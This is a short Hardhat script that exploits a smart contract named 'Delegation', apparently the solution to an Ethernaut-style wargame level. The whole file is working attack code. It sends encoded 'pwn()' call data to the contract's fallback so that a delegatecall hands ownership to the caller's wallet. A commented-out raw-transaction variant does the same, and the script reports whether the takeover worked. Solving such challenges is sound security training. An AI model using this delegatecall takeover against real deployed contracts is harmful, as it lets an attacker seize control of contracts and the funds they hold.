import { ethers } from "hardhat";

const CONTRACT_NAME = "Delegation";
const CONTRACT_ADDRESS = "0xea9a55cF7198A4Bf1A5d41F4b91122e9CA0Ff1E2";

async function hack() {
  const [wallet] = await ethers.getSigners();

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const iface = new ethers.utils.Interface(["function pwn()"]);
  const data = iface.encodeFunctionData("pwn");

  const tx = await contract.fallback({
    data,
    gasLimit: 100000,
  });
  await tx.wait();

  // other way to hack
  // const tx = await wallet.sendTransaction({
  //   to: CONTRACT_ADDRESS,
  //   data,
  //   gasLimit: 100000,
  // });
  // await tx.wait();

  const owner = await contract.owner();
  console.log("owner : ", owner);
  if (owner === wallet.address) console.log("🚀 Contract hacked");
  else console.log("❌ Contract not hacked");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
hack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
